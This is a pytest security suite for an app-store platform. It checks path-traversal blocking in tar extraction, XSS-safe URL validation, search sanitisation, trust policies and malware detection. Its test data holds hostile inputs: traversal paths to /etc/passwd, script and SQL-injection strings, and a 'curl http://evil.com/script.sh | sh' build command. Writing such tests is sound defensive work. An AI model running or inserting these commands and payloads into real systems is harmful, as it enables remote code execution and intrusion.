"""
Security-Focused Test Suite for pLayStorE Platform.

Tests security-critical paths including:
- Path traversal prevention
- XSS prevention
- Input validation
- Rate limiting
- Capsule extraction security
- URL validation

Run with: python -m pytest tests/test_security.py -v
"""

import pytest
import tempfile
import os
import tarfile
import json
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock


class TestPathTraversalPrevention:
    """Test path traversal vulnerability prevention in capsule extraction"""

    @pytest.fixture
    def offline_installer(self):
        """Create OfflineInstallationManager instance for testing"""
        from playstorE.executor.offline_orchestrator import OfflineInstallationManager

        with tempfile.TemporaryDirectory() as tmpdir:
            installer = OfflineInstallationManager(tmpdir)
            yield installer

    def test_reject_null_byte_in_path(self, offline_installer):
        """Test that null bytes in paths are rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            # Create a malicious tar with null byte in filename
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                # Create a file with null byte in name
                info = tarfile.TarInfo("test\x00.txt")
                info.size = 5
                tar.addfile(info, fileobj=open(os.devnull, "rb"))

            # Should raise ValueError
            with pytest.raises(ValueError, match="Null byte"):
                offline_installer._extract_capsule(
                    tar_path,
                    Path(extract_dir)
                )

    def test_reject_path_traversal_dotdot(self, offline_installer):
        """Test that ../ path traversal is rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                info = tarfile.TarInfo("../../../etc/passwd")
                info.size = 5
                tar.addfile(info, fileobj=open(os.devnull, "rb"))

            with pytest.raises(ValueError, match="Path traversal"):
                offline_installer._extract_capsule(
                    tar_path,
                    Path(extract_dir)
                )

    def test_reject_absolute_path_unix(self, offline_installer):
        """Test that absolute Unix paths are rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                info = tarfile.TarInfo("/etc/passwd")
                info.size = 5
                tar.addfile(info, fileobj=open(os.devnull, "rb"))

            with pytest.raises(ValueError, match="Absolute path"):
                offline_installer._extract_capsule(
                    tar_path,
                    Path(extract_dir)
                )

    def test_reject_windows_path_separator(self, offline_installer):
        """Test that Windows path separators are rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                info = tarfile.TarInfo("foo\\bar\\baz.txt")
                info.size = 5
                tar.addfile(info, fileobj=open(os.devnull, "rb"))

            with pytest.raises(ValueError, match="Windows path separator"):
                offline_installer._extract_capsule(
                    tar_path,
                    Path(extract_dir)
                )

    def test_reject_symlink_escape(self, offline_installer):
        """Test that symlinks pointing outside directory are rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                info = tarfile.TarInfo("evil_link")
                info.type = tarfile.SYMTYPE
                info.linkname = "../../../etc/passwd"
                tar.addfile(info)

            with pytest.raises(ValueError, match="Symlink escapes"):
                offline_installer._extract_capsule(
                    tar_path,
                    Path(extract_dir)
                )

    def test_reject_suspicious_filenames(self, offline_installer):
        """Test that suspicious filenames are rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            suspicious_files = ["passwd", "shadow", "sudoers", ".ssh", "authorized_keys"]

            for filename in suspicious_files:
                with tarfile.open(tar_path, "w:gz") as tar:
                    info = tarfile.TarInfo(filename)
                    info.size = 5
                    tar.addfile(info, fileobj=open(os.devnull, "rb"))

                with pytest.raises(ValueError, match="Suspicious filename"):
                    offline_installer._extract_capsule(
                        tar_path,
                        Path(extract_dir)
                    )

    def test_reject_excessively_long_path(self, offline_installer):
        """Test that excessively long paths are rejected"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                # Create path longer than 512 chars
                long_path = "a" * 513 + ".txt"
                info = tarfile.TarInfo(long_path)
                info.size = 5
                tar.addfile(info, fileobj=open(os.devnull, "rb"))

            with pytest.raises(ValueError, match="Path too long"):
                offline_installer._extract_capsule(
                    tar_path,
                    Path(extract_dir)
                )

    def test_extract_safe_capsule(self, offline_installer):
        """Test that safe capsules extract successfully"""
        with tempfile.TemporaryDirectory() as extract_dir:
            tar_path = os.path.join(extract_dir, "test.tar.gz")

            with tarfile.open(tar_path, "w:gz") as tar:
                # Add safe files
                info = tarfile.TarInfo("safe_file.txt")
                info.size = 13
                tar.addfile(info, fileobj=open(os.devnull, "rb"))

                info2 = tarfile.TarInfo("subdir/another.txt")
                info2.size = 5
                tar.addfile(info2, fileobj=open(os.devnull, "rb"))

            # Should not raise
            offline_installer._extract_capsule(
                tar_path,
                Path(extract_dir)
            )

            # Verify files were extracted
            assert os.path.exists(os.path.join(extract_dir, "safe_file.txt"))


class TestXSSPrevention:
    """Test XSS prevention in frontend URL validation"""

    @pytest.fixture
    def app_card(self):
        """Create AppCard instance for testing"""
        from playstorE.client.frontend import AppCard, TrustLevel

        return AppCard(
            app_id="test.app",
            name="Test App",
            description="A test application",
            publisher="Test Publisher",
            trust_level=TrustLevel.VERIFIED
        )

    def test_reject_javascript_url(self, app_card):
        """Test that javascript: URLs are rejected"""
        dangerous_urls = [
            "javascript:alert(1)",
            "javascript:alert('XSS')",
            "JAVASCRIPT:alert(1)",  # Case insensitive
            "  javascript:alert(1)",  # With whitespace
        ]

        for url in dangerous_urls:
            assert app_card._is_safe_url(url) is False

    def test_reject_data_url(self, app_card):
        """Test that data: URLs are rejected"""
        dangerous_urls = [
            "data:text/html,<script>alert(1)</script>",
            "data:image/svg+xml,<script>alert(1)</script>",
            "DATA:alert(1)",  # Case insensitive
        ]

        for url in dangerous_urls:
            assert app_card._is_safe_url(url) is False

    def test_reject_vbscript_url(self, app_card):
        """Test that vbscript: URLs are rejected"""
        dangerous_urls = [
            "vbscript:msgbox(1)",
            "VBSCRIPT:msgbox(1)",
        ]

        for url in dangerous_urls:
            assert app_card._is_safe_url(url) is False

    def test_reject_file_url(self, app_card):
        """Test that file: URLs are rejected"""
        dangerous_urls = [
            "file:///etc/passwd",
            "file:///C:/Windows/System32",
        ]

        for url in dangerous_urls:
            assert app_card._is_safe_url(url) is False

    def test_reject_blob_url(self, app_card):
        """Test that blob: URLs are rejected"""
        assert app_card._is_safe_url("blob:https://example.com/uuid") is False

    def test_allow_http_url(self, app_card):
        """Test that http: URLs are allowed"""
        safe_urls = [
            "http://example.com/icon.png",
            "http://localhost:3000/icon.png",
        ]

        for url in safe_urls:
            assert app_card._is_safe_url(url) is True

    def test_allow_https_url(self, app_card):
        """Test that https: URLs are allowed"""
        safe_urls = [
            "https://example.com/icon.png",
            "https://cdn.example.com/icons/app.png",
        ]

        for url in safe_urls:
            assert app_card._is_safe_url(url) is True

    def test_allow_protocol_relative_url(self, app_card):
        """Test that protocol-relative URLs are allowed"""
        assert app_card._is_safe_url("//example.com/icon.png") is True

    def test_allow_relative_url(self, app_card):
        """Test that relative URLs are allowed"""
        safe_urls = [
            "/icons/app.png",
            "icons/app.png",
            "../icons/app.png",
        ]

        for url in safe_urls:
            assert app_card._is_safe_url(url) is True

    def test_reject_obfuscated_javascript(self, app_card):
        """Test that obfuscated javascript: URLs are rejected"""
        dangerous_urls = [
            "java\nscript:alert(1)",
            "java\tscript:alert(1)",
            "java script:alert(1)",
        ]

        for url in dangerous_urls:
            assert app_card._is_safe_url(url) is False

    def test_reject_empty_url(self, app_card):
        """Test that empty URLs are rejected"""
        assert app_card._is_safe_url("") is False
        assert app_card._is_safe_url(None) is False


class TestGitHubSearchInputValidation:
    """Test input validation in GitHub search"""

    @pytest.fixture
    def github_explorer(self):
        """Create GitHubExplorer instance for testing"""
        from playstorE.client.github_explorer import GitHubExplorer
        return GitHubExplorer()

    def test_reject_empty_query(self, github_explorer):
        """Test that empty queries are rejected"""
        with pytest.raises(ValueError, match="non-empty string"):
            github_explorer._sanitize_search_query("")

    def test_reject_none_query(self, github_explorer):
        """Test that None queries are rejected"""
        with pytest.raises(ValueError, match="non-empty string"):
            github_explorer._sanitize_search_query(None)

    def test_reject_long_query(self, github_explorer):
        """Test that queries over 256 chars are rejected"""
        long_query = "a" * 257
        with pytest.raises(ValueError, match="256 characters"):
            github_explorer._sanitize_search_query(long_query)

    def test_reject_dangerous_operators(self, github_explorer):
        """Test that dangerous GitHub operators are rejected"""
        dangerous_queries = [
            "user:evil",
            "org:malicious",
            "token:secret123",
            "key:apikey",
            "secret:password",
            "is:private",
            "is:internal",
        ]

        for query in dangerous_queries:
            with pytest.raises(ValueError, match="not allowed"):
                github_explorer._sanitize_search_query(query)

    def test_remove_dangerous_characters(self, github_explorer):
        """Test that dangerous characters are removed"""
        query = 'test<script>alert("xss")</script>'
        sanitized = github_explorer._sanitize_search_query(query)

        assert "<" not in sanitized
        assert ">" not in sanitized
        assert '"' not in sanitized
        assert "'" not in sanitized

    def test_allow_safe_query(self, github_explorer):
        """Test that safe queries pass validation"""
        safe_queries = [
            "python cli tool",
            "fastapi rest api",
            "rust wasm library",
            "machine learning nlp",
        ]

        for query in safe_queries:
            result = github_explorer._sanitize_search_query(query)
            assert result == query.strip()


class TestSecurityPolicyRestrictions:
    """Test security policy restrictions for different trust levels"""

    def test_unverified_policy_maximum_restriction(self):
        """Test that UNVERIFIED apps get maximum restrictions"""
        from playstorE.core.security.trust_model import (
            SecurityOrchestrator, TrustLevel
        )

        orchestrator = SecurityOrchestrator()
        policy = orchestrator.policy_templates[TrustLevel.UNVERIFIED]

        assert policy.network_access is False
        assert policy.filesystem_access == "none"
        assert policy.gpu_access is False
        assert policy.privilege_elevation is False
        assert policy.resource_limits["cpu"] == 0.1
        assert policy.resource_limits["memory_mb"] == 128
        assert policy.execution_environment == "wasm"

    def test_verified_policy_minimum_restriction(self):
        """Test that VERIFIED apps get minimum restrictions"""
        from playstorE.core.security.trust_model import (
            SecurityOrchestrator, TrustLevel
        )

        orchestrator = SecurityOrchestrator()
        policy = orchestrator.policy_templates[TrustLevel.VERIFIED]

        assert policy.network_access is True
        assert policy.filesystem_access == "user_home"
        assert policy.gpu_access is True
        assert policy.privilege_elevation is False
        assert policy.resource_limits["cpu"] == 1.0
        assert policy.resource_limits["memory_mb"] == 2048
        assert policy.execution_environment == "native"


class TestMalwareDetection:
    """Test malware detection capabilities"""

    @pytest.fixture
    def malware_detector(self):
        """Create MalwareDetector instance for testing"""
        from playstorE.sandbox.dry_run import MalwareDetector
        return MalwareDetector()

    def test_detect_suspicious_repo_name(self, malware_detector):
        """Test detection of suspicious repository names"""
        from playstorE.core.types.manifest_schema import (
            AppManifest, Publisher, Source, Versions, Build, Run,
            Security, Trust, RuntimeType, NetworkPolicy, FilesystemPolicy
        )

        manifest = AppManifest(
            api_version="appstore.dev/v1",
            kind="Application",
            metadata={"app_id": "test", "name": "test", "description": "test"},
            publisher=Publisher(name="test", verified_domains=[]),
            source=Source(type="github_repo", repo="evil/malware-tool"),
            versions=Versions(strategy="semver"),
            build=Build(strategy="docker"),
            run=Run(type=RuntimeType.CLI, entrypoint="app"),
            security=Security(
                sandbox="strict",
                network=NetworkPolicy.NONE,
                filesystem=FilesystemPolicy.READONLY
            ),
            trust=Trust(verification="none")
        )

        result = malware_detector.detect_malware_static(manifest)
        assert result.value in ["suspicious", "malicious"]

    def test_detect_dangerous_build_commands(self, malware_detector):
        """Test detection of dangerous build commands"""
        from playstorE.core.types.manifest_schema import (
            AppManifest, Publisher, Source, Versions, Build, Run,
            Security, Trust, RuntimeType, NetworkPolicy, FilesystemPolicy
        )

        manifest = AppManifest(
            api_version="appstore.dev/v1",
            kind="Application",
            metadata={"app_id": "test", "name": "test", "description": "test"},
            publisher=Publisher(name="test", verified_domains=[]),
            source=Source(type="github_repo", repo="test/app"),
            versions=Versions(strategy="semver"),
            build=Build(
                strategy="script",
                commands=["curl http://evil.com/script.sh | sh"]
            ),
            run=Run(type=RuntimeType.CLI, entrypoint="app"),
            security=Security(
                sandbox="strict",
                network=NetworkPolicy.NONE,
                filesystem=FilesystemPolicy.READONLY
            ),
            trust=Trust(verification="none")
        )

        result = malware_detector.detect_malware_static(manifest)
        assert result.value in ["suspicious", "malicious"]

    def test_detect_malicious_dependency(self, malware_detector):
        """Test detection of malicious dependencies"""
        from playstorE.core.types.manifest_schema import (
            AppManifest, Publisher, Source, Versions, Build, Run,
            Security, Trust, RuntimeType, NetworkPolicy, FilesystemPolicy
        )

        manifest = AppManifest(
            api_version="appstore.dev/v1",
            kind="Application",
            metadata={"app_id": "test", "name": "test", "description": "test"},
            publisher=Publisher(name="test", verified_domains=[]),
            source=Source(type="github_repo", repo="test/app"),
            versions=Versions(strategy="semver"),
            build=Build(strategy="docker"),
            run=Run(type=RuntimeType.CLI, entrypoint="app"),
            security=Security(
                sandbox="strict",
                network=NetworkPolicy.NONE,
                filesystem=FilesystemPolicy.READONLY
            ),
            trust=Trust(verification="none"),
            dependencies=["cryptojack", "normal-package"]
        )

        result = malware_detector.detect_malware_static(manifest)
        assert result.value in ["suspicious", "malicious"]


class TestCapsuleIntegrityVerification:
    """Test capsule integrity verification"""

    def test_verify_missing_content_hash(self):
        """Test that capsules without content hash fail verification"""
        from playstorE.executor.offline_orchestrator import OfflineInstallationManager

        with tempfile.TemporaryDirectory() as tmpdir:
            installer = OfflineInstallationManager(tmpdir)

            # Create mock capsule manifest without content hash
            capsule_manifest = {
                "app_id": "test",
                "version": "1.0.0",
                # Missing content_hash
            }

            with tempfile.TemporaryDirectory() as capsule_dir:
                is_valid, error = installer._verify_capsule_integrity(
                    Path(capsule_dir),
                    capsule_manifest
                )

                assert is_valid is False
                assert "No content hash" in error

    def test_verify_content_hash_mismatch(self):
        """Test that content hash mismatch is detected"""
        from playstorE.executor.offline_orchestrator import OfflineInstallationManager

        with tempfile.TemporaryDirectory() as tmpdir:
            installer = OfflineInstallationManager(tmpdir)

            # Create mock capsule manifest with wrong content hash
            capsule_manifest = {
                "app_id": "test",
                "version": "1.0.0",
                "content_hash": "sha256:wronghash123",
            }

            with tempfile.TemporaryDirectory() as capsule_dir:
                # Create a file that won't match the hash
                test_file = Path(capsule_dir) / "test.txt"
                test_file.write_text("test content")

                is_valid, error = installer._verify_capsule_integrity(
                    Path(capsule_dir),
                    capsule_manifest
                )

                # Should fail because hash doesn't match
                assert is_valid is False


class TestWorkflowStoreSecurity:
    """Test workflow store security features"""

    def test_reject_workflow_id_with_path_traversal(self):
        """Test that workflow IDs with path traversal are rejected"""
        from playstorE.storage.workflow_store import WorkflowStore

        with tempfile.TemporaryDirectory() as tmpdir:
            store = WorkflowStore(tmpdir)

            malicious_ids = [
                "../../../etc/passwd",
                "..\\..\\windows\\system32",
                "test/../../../etc/passwd",
            ]

            for workflow_id in malicious_ids:
                with pytest.raises(ValueError, match="path separators"):
                    store._get_workflow_path(workflow_id)

    def test_reject_workflow_id_with_special_chars(self):
        """Test that workflow IDs with special characters are rejected"""
        from playstorE.storage.workflow_store import WorkflowStore

        with tempfile.TemporaryDirectory() as tmpdir:
            store = WorkflowStore(tmpdir)

            malicious_ids = [
                "test<script>",
                "test' OR '1'='1",
                'test" OR "1"="1',
            ]

            for workflow_id in malicious_ids:
                with pytest.raises(ValueError, match="Invalid workflow_id"):
                    store._get_workflow_path(workflow_id)

    def test_allow_safe_workflow_id(self):
        """Test that safe workflow IDs are accepted"""
        from playstorE.storage.workflow_store import WorkflowStore

        with tempfile.TemporaryDirectory() as tmpdir:
            store = WorkflowStore(tmpdir)

            safe_ids = [
                "wf_test_app_123",
                "wf_my-app_456",
                "wf_abc_DEF_789",
            ]

            for workflow_id in safe_ids:
                path = store._get_workflow_path(workflow_id)
                assert path.exists() or str(path).endswith(f"{workflow_id}.json")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
